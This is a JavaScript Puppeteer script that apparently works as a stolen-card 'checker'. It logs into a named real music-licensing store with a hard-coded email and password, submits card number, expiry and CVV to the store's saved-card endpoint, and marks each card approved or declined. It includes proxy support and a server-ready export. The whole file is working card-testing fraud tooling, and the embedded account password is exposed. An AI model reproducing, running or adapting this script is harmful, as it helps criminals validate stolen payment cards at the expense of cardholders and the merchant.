// b3-auth.js
// Optimized for speed + includes execution time measurement
// ✅ Cleaned for server integration (no CLI auto-run)

import puppeteer from "puppeteer";

const LOGIN_EMAIL = "veronique12lacroix@gmail.com";
const LOGIN_PASSWORD = "Hawkeye1121.";

async function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

async function waitAndClick(page, selector) {
  try {
    await page.waitForSelector(selector, { visible: true, timeout: 10000 });
    await page.click(selector, { delay: 50 });
    return true;
  } catch {
    return false;
  }
}

async function safeLogin(page) {
  const selectors = [
    'button[type="submit"]',
    'button[title="Login"]',
    'button[title="Sign In"]',
    "button.action.login.primary",
  ];

  await page.waitForSelector('input[name="login[username]"]', { visible: true });
  await page.type('input[name="login[username]"]', LOGIN_EMAIL, { delay: 30 });
  await page.type('input[name="login[password]"]', LOGIN_PASSWORD, {
    delay: 30,
  });

  for (const sel of selectors) {
    const ok = await waitAndClick(page, sel);
    if (ok) {
      await page
        .waitForNavigation({ waitUntil: "domcontentloaded", timeout: 20000 })
        .catch(() => {});
      return true;
    }
  }

  // fallback submit
  await page.evaluate(() => {
    const form = document.querySelector('form[action*="login"]');
    if (form) form.submit();
  });
  await page
    .waitForNavigation({ waitUntil: "domcontentloaded", timeout: 20000 })
    .catch(() => {});
  return true;
}

/**
 * ✅ Main exported function for API/server integration
 */
export async function runCheck(cardInput, proxyArg = null) {
  const [cc, mm, yyyy, cvv] = cardInput.split(/[|:]/).map((s) => s.trim());
  if (!cc || !mm || !yyyy || !cvv) {
    return {
      status: "#Error",
      message: 'Invalid input. Use "CARD|MM|YYYY|CVV"',
      response_time_ms: 0,
    };
  }

  const base = "https://www.royaltyfreefitnessmusic.com";
  const loginUrl = `${base}/customer/account/login/`;
  const vaultUrl = `${base}/vault/cards/listaction/`;
  const postUrl = `${base}/vault/cards/add/`;

  const args = ["--no-sandbox", "--disable-setuid-sandbox"];
  if (proxyArg) args.push(`--proxy-server=${proxyArg}`);

  const startTime = Date.now();

  const browser = await puppeteer.launch({ headless: true, args });
  const page = await browser.newPage();

  // 🧠 Block heavy resources (CSS, images, fonts) for faster loads
  await page.setRequestInterception(true);
  page.on("request", (req) => {
    const type = req.resourceType();
    if (["image", "stylesheet", "font", "media"].includes(type)) req.abort();
    else req.continue();
  });

  await page.setUserAgent(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  );

  let interceptedMessage = null;
  page.on("response", async (response) => {
    const headers = response.headers();
    if (headers["set-cookie"]?.includes("mage-messages")) {
      const cookies = headers["set-cookie"].split(/,(?=[^;]+?=)/g);
      for (const ck of cookies) {
        if (ck.includes("mage-messages")) interceptedMessage = ck;
      }
    }
  });

  try {
    // Login
    await page.goto(loginUrl, { waitUntil: "domcontentloaded" });
    await safeLogin(page);

    // Load vault page
    await page.goto(vaultUrl, { waitUntil: "domcontentloaded" });

    // Extract form key
    const formKey = await page.evaluate(() => {
      const el = document.querySelector('input[name="form_key"]');
      return el ? el.value : null;
    });
    if (!formKey) throw new Error("form_key not found.");

    // Post card data
    await page.evaluate(
      async ({ postUrl, cc, mm, yyyy, cvv, formKey }) => {
        function encode(obj) {
          return Object.entries(obj)
            .map(
              ([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`
            )
            .join("&");
        }
        const payload = {
          form_key: formKey,
          "payment[cc_type]": "",
          "payment[cc_number]": cc,
          "payment[cc_exp_month]": mm,
          "payment[cc_exp_year]": yyyy,
          "payment[cc_cid]": cvv,
        };
        await fetch(postUrl, {
          method: "POST",
          credentials: "same-origin",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: encode(payload),
        });
      },
      { postUrl, cc, mm, yyyy, cvv, formKey }
    );

    // Short delay for Set-Cookie capture
    await delay(1000);

    let message = "No message found";
    if (interceptedMessage) {
      try {
        const raw = interceptedMessage.split("mage-messages=")[1].split(";")[0];
        let dec = decodeURIComponent(raw);
        dec = decodeURIComponent(dec);
        const parsed = JSON.parse(dec);
        if (Array.isArray(parsed) && parsed[0].text) message = parsed[0].text;
        else message = dec;
      } catch {
        message = interceptedMessage;
      }
    }

    const lower = message.toLowerCase();
    const status =
      lower.includes("approved") || lower.includes("success")
        ? "#Aprovada"
        : "#Reprovada";

    const totalTime = Date.now() - startTime;
    const seconds = (totalTime / 1000).toFixed(2);

    await browser.close();
    return {
      status,
      message,
      response_time_ms: totalTime,
      response_time_sec: seconds,
    };
  } catch (err) {
    const totalTime = Date.now() - startTime;
    await browser.close();
    return {
      status: "#Reprovada",
      message: err.message,
      response_time_ms: totalTime,
    };
  }
}
